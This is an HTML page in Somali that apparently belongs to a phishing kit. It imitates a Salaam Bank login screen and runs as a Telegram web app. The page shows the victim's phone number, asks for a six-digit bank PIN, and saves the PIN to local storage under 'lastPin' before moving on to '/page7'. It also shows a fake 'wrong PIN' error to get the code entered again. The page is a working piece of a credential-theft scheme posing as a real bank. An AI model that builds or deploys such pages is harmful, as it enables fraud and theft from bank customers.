<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Salaam Bank - Gelitaanka</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bank-primary: #008751;
            --bank-gradient: linear-gradient(180deg, #00aa63 0%, #008751 100%);
            --bg-color: #ffffff;
            --text-dark: #333333;
            --text-muted: #777777;
            --btn-disabled-bg: #e2e2e2;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .header-box { width: 100%; background: var(--bank-gradient); padding: 30px 20px 25px; color: white; text-align: center; }
        .header-title { font-size: 32px; font-weight: 800; margin: 0; display: flex; justify-content: center; align-items: center; }
        .header-title .salaam { color: #ffd700; margin-right: 6px; }
        .sub-header-text { font-size: 14px; margin-top: 6px; font-weight: 500; }
        .main-content { width: 90%; max-width: 400px; margin: 25px auto 0; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
        h2 { color: #555555; font-size: 22px; margin: 10px 0 25px; font-weight: 600; }
        .phone-display { width: 100%; border: 1.5px solid var(--bank-primary); border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 20px; font-size: 18px; font-weight: 700; }
        .pin-wrapper { position: relative; width: 100%; display: flex; justify-content: center; align-items: center; margin-bottom: 8px; }
        .pin-input-group { display: flex; gap: 8px; justify-content: center; }
        .pin-box { width: 44px; height: 50px; border: 1.5px solid var(--bank-primary); border-radius: 10px; text-align: center; font-size: 20px; font-weight: bold; outline: none; }
        .toggle-eye { position: absolute; right: -25px; cursor: pointer; font-size: 20px; }
        .btn-submit { background-color: var(--btn-disabled-bg); color: #ffffff; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .btn-submit.active { background-color: var(--bank-primary); cursor: pointer; }
        .error-banner { background-color: #fde8e8; color: #e74c3c; border: 1px solid #f8b4b4; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; width: 100%; display: none; }
        .footer-box { width: 100%; background: var(--bank-gradient); padding: 35px 20px 20px; color: white; text-align: center; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; margin-top: auto; }
    </style>
</head>
<body>
<div class="header-box">
    <div class="header-title"><span class="salaam">Salaam</span> Bank</div>
    <div class="sub-header-text">Adeegga Maaliyadeed ee Salaam</div>
</div>

<div class="main-content">
    <h2>Gali PIN-ka Bangiga</h2>
    <div id="errorDisplay" class="error-banner">PIN-ka aad gelisay waa khalad. Fadlan dib u tijaabi.</div>

    <div class="phone-display">
        <span>🇸🇴</span>
        <span>+252</span>
        <span id="displayPhone">--</span>
    </div>

    <p style="color:var(--text-muted); font-size:14px; margin-bottom:16px;">Gali lambarkaaga sirta ah ee bangiga (6 lambar)</p>

    <div class="pin-wrapper">
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        </div>
        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
    </div>

    <button id="loginBtn" class="btn-submit" disabled style="margin-top: 35px;">GAL</button>
</div>

<div class="footer-box">
    <div class="header-title" style="font-size:24px;"><span class="salaam">Salaam</span> Bank</div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    displayPhone.textContent = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "615000000";

    if (localStorage.getItem('wrongPinAttempt') === 'true') {
        errorDisplay.style.display = 'block';
        localStorage.removeItem('wrongPinAttempt');
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value.length === 1);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    eye.addEventListener('click', () => {
        const isPassword = pinBoxes[0].type === "password";
        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
    });

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "/page7";
    });
});
</script>
</body>
</html>
